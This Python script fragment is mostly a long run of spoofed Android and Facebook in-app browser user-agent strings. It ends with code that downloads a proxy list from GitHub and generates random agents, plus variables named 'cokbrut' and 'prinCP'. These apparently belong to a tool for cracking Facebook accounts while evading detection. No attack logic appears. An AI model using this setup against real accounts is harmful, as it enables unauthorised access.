ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5846.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.5826.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.4219.75 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5544.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5566.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.5719.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3029.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.5687.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3781.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3204.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.5666.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5269.98 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3530.90 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4132.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3648.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5236.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5048.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.5876.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.3979.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.4128.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3743.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.3874.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5365.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3910.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.4304.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.4129.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.3144.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4829.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5667.29 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.5490.30 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.5306.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3086.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5215.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.5639.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.5297.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.4305.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.5633.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5409.77 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4542.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5174.83 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.5865.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5892.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5083.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.4920.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3827.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.4729.83 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.5651.85 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4743.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5991.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.3207.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5648.59 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3913.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4385.64 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3169.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3399.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5064.77 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.5714.54 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.3825.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.3816.33 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.3086.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4099.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.5043.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4928.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.4369.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4534.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3859.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4982.45 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5928.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.4511.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3067.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3375.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3930.29 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5065.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3654.25 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.4355.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.5531.34 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3211.70 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.3781.80 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3706.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4235.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3661.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4265.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.3271.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3147.38 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.4614.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4687.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.3894.56 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3183.20 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4640.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3357.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4014.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.4518.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.5102.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.3285.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3888.55 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.5159.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5714.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5576.81 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5598.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4221.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.42 Chrome/113.0.5672.162 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/374.0.0.10.114",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 13; V2172A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113",]
ua = ["Mozilla/5.0 (Linux; Android 10; V2002A Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77",]
ua = ["Mozilla/5.0 (Linux; Android 11; I2012 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3121 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115",]
ua = ["Mozilla/5.0 (Linux; Android 12;CPH2365 Build/RKQ1.211119.001; wv)AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/103.0.5060.129Mobile Safari/537.36 [FB_IAB/OrcaAndroid;FBAV/372.0.0.10.112;",]
ua = ["Mozilla/5.0 (Linux; U; Android 10;Device HUAWEI Mate 20 lite)AppleWebkit/534.30 (KHTML, likeGecko) Version/4.0 Mobile Safari534.30 Spotify/860200774 (6; 2; 7)",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.364.",]
ua = ["Mozilla/5.0 (Linux; Android 9; itel L5503 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/320.0.0.12.108;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3511 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 12; en-US; TECNO KI5k Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.5.5.1313 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; Z30 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; Infinix X604) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4652.156 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; LH9810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36,gzip(gfe)",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Prime Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 YaApp_Android/10.61 YaSearchBrowser/10.61",]
ua = ["Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",]
ua = ["Mozilla/5.0 (Linux; Android 12; RMX3371 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3506 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.33.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3311 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; 23030RAC7Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/378.0.0.12.118;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/438.0.0.34.118;",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2209116AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;",]
ua = ["Mozilla/5.0 (Linux; Android 13; 2210129SG Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://github.com/MAHADI-143/BDMC/blob/main/.prox.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
